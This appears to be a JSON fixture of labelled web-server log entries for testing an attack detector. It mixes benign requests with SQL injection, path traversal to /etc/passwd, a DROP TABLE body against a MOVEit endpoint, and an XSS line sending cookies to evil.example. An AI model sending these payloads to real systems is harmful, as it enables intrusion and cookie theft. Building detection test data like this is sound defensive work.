@@ -1,0 +1,90 @@
+[
+  {
+    "id": "WZ-0001",
+    "timestamp": "2026-10-11T09:03:12Z",
+    "agent": { "name": "choi-bujang-pc", "ip": "10.20.1.44" },
+    "data": { "srcip": "10.20.1.44", "user": "choi.bujang", "method": "GET" },
+    "rule": { "level": 3, "description": "GET /portal/dashboard.html HTTP/1.1 200" },
+    "_expected": "benign"
+  },
+  {
+    "id": "WZ-0002",
+    "timestamp": "2026-10-11T09:05:40Z",
+    "agent": { "name": "choi-bujang-pc", "ip": "10.20.1.44" },
+    "data": { "srcip": "10.20.1.44", "user": "choi.bujang", "method": "POST" },
+    "rule": { "level": 3, "description": "POST /portal/login HTTP/1.1 200 (user=choi.bujang&password=Summer2026!&token=ab12cd34ef)" },
+    "_expected": "benign"
+  },
+  {
+    "id": "WZ-0003",
+    "timestamp": "2026-10-11T09:11:02Z",
+    "agent": { "name": "ext-gw-01", "ip": "203.0.113.17" },
+    "data": { "srcip": "203.0.113.17", "user": "anonymous", "method": "GET" },
+    "rule": { "level": 10, "description": "GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1 500" },
+    "_expected": "attack"
+  },
+  {
+    "id": "WZ-0004",
+    "timestamp": "2026-10-11T09:12:47Z",
+    "agent": { "name": "ext-gw-01", "ip": "203.0.113.17" },
+    "data": { "srcip": "203.0.113.17", "user": "anonymous", "method": "GET" },
+    "rule": { "level": 10, "description": "GET /items?id=10' OR '1'='1 HTTP/1.1 200" },
+    "_expected": "attack"
+  },
+  {
+    "id": "WZ-0005",
+    "timestamp": "2026-10-11T09:14:19Z",
+    "agent": { "name": "ext-gw-01", "ip": "203.0.113.18" },
+    "data": { "srcip": "203.0.113.18", "user": "anonymous", "method": "GET" },
+    "rule": { "level": 10, "description": "GET /comments?msg=<script>document.location='http://evil.example/'+document.cookie</script> HTTP/1.1 200" },
+    "_expected": "attack"
+  },
+  {
+    "id": "WZ-0006",
+    "timestamp": "2026-10-11T09:16:55Z",
+    "agent": { "name": "ext-gw-01", "ip": "203.0.113.18" },
+    "data": { "srcip": "203.0.113.18", "user": "anonymous", "method": "GET" },
+    "rule": { "level": 10, "description": "GET /download?file=../../../../../../etc/passwd HTTP/1.1 200" },
+    "_expected": "attack"
+  },
+  {
+    "id": "WZ-0007",
+    "timestamp": "2026-10-11T09:20:08Z",
+    "agent": { "name": "mkt-team-pc", "ip": "10.20.3.9" },
+    "data": { "srcip": "10.20.3.9", "user": "kim.sarang", "method": "POST" },
+    "rule": { "level": 2, "description": "POST /survey?answer=please select your favorite color HTTP/1.1 200" },
+    "_expected": "benign"
+  },
+  {
+    "id": "WZ-0008",
+    "timestamp": "2026-10-11T09:22:31Z",
+    "agent": { "name": "mkt-team-pc", "ip": "10.20.3.9" },
+    "data": { "srcip": "10.20.3.9", "user": "kim.sarang", "method": "GET" },
+    "rule": { "level": 2, "description": "GET /files/subscription_script_v2.pdf HTTP/1.1 200" },
+    "_expected": "benign"
+  },
+  {
+    "id": "WZ-0009",
+    "timestamp": "2026-10-11T09:24:50Z",
+    "agent": { "name": "mkt-team-pc", "ip": "10.20.3.9" },
+    "data": { "srcip": "10.20.3.9", "user": "kim.sarang", "method": "GET" },
+    "rule": { "level": 2, "description": "GET /blog/post?img=../images/logo.png HTTP/1.1 200" },
+    "_expected": "benign"
+  },
+  {
+    "id": "WZ-0010",
+    "timestamp": "2026-10-11T09:27:14Z",
+    "agent": { "name": "dev-test-pc", "ip": "10.20.5.21" },
+    "data": { "srcip": "10.20.5.21", "user": "park.hyun", "method": "GET" },
+    "rule": { "level": 5, "description": "GET /api/v2/notes?title=1=1 is always true in math class HTTP/1.1 200" },
+    "_expected": "ambiguous"
+  },
+  {
+    "id": "WZ-0011",
+    "timestamp": "2026-10-11T09:31:03Z",
+    "agent": { "name": "ext-gw-01", "ip": "198.51.100.23" },
+    "data": { "srcip": "198.51.100.23", "user": "anonymous", "method": "POST" },
+    "rule": { "level": 12, "description": "POST /moveitisapi/moveitisapi.dll?method=HandleAttachment HTTP/1.1 500 (body: '; DROP TABLE users;--)" },
+    "_expected": "attack"
+  }
+]
